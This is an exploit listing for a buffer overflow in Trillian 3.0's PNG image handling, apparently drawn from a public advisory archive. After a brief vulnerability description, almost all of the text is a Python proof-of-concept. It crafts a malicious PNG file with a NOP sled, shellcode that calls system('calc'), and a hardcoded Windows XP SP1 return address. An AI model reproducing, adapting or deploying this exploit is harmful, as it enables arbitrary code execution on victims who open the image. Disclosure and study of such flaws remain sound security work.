source: http://www.securityfocus.com/bid/12703/info

A remote buffer overflow vulnerability affects Cerulean Studios Trillian. This issue is due to a failure of the application to securely copy image data into finite process buffers.

An attacker may leverage this issue to execute arbitrary code with the privileges of an unsuspecting user that activated the vulnerable application. 

#########################################
#                                                                                        #
#                      See-security Technologies ltd.                       #
#                                                                                        #
#                      http://www.see-security.com                         #
#                                                                                        #
#########################################
#                                                                                        #
#   Trillian 3.0 PNG Image Processing Buffer overflow Exploit   #
#                                                                                        #
#                                                                                        #
#                Discovered and coded by: Tal zeltzer                   #
#                                                                                        #
#########################################

import sys
import struct

# Addresses are compatible with Windows XP Service Pack 1
ReturnAddress = 0x77D7A145 # Address of "jmp esp" in ntdll.dll 
SystemAddress = 0x77C28044 # Address Of the system() function

# PNG Header
PngOfDeath = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52"
PngOfDeath += "\x00\x00\x00\x40\x00\x00\x00\x40\x08\x03\x00\x00\x00\x9D\xB7\x81"
PngOfDeath += "\xEC\x00\x00\x01\xB9\x74\x52\x4E\x53"

# Nops
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90"

# system(calc) shellcode
PngOfDeath += "\x33\xC0\x50\x68\x63\x61\x6c\x63\x54\x5b\x50\x53\xb9"
PngOfDeath += struct.pack("<L",SystemAddress)
PngOfDeath += "\xFF\xD1"

# Junk Data
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
PngOfDeath += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

# Return Address
PngOfDeath += struct.pack("<L",ReturnAddress)

# Jump Back Shellcode
PngOfDeath += "\x54\x59\xFE\xCD\x89\xE5\xFF\xE1"

# End Of File
PngOfDeath += "\x90\x90\x90\x59\xE8\x47\xFE\xFF\xFF"

fileOut = open("Trillian.png","wb")
fileOut.write(PngOfDeath)
fileOut.close()